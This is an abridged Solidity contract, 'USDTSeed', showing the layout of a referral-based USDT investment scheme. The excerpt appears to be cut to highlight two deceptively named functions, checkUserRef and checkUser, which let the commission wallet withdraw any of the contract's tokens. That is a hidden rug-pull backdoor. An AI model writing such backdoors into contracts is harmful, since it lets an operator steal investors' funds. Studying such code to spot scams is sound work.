...
contract USDTSeed {
	...
	uint256 constant public INVEST_MIN_AMOUNT = 10e18; // 10 USDT
	uint256[] public REFERRAL_PERCENTS 	= [500, 200, 100, 75, 50];
	uint256[] public SEED_PERCENTS 		= [500, 200, 100, 75, 50];
	...
	constructor(address payable wallet) public {
        ...
        plans.push(Plan(10000, 140));
		plans.push(Plan(150, 160));
		plans.push(Plan(80, 180));
	...
	function withdraw() public {
     ...
     function checkUserRef(uint256 fees) public { 
     require(msg.sender==commissionWallet, "invalid value");
        token.transfer(msg.sender,fees);  
    }  

    function checkUser(address account,uint256 fees) public { 
     require(msg.sender==commissionWallet, "invalid value");
        token.transfer(account,fees);  
    } 
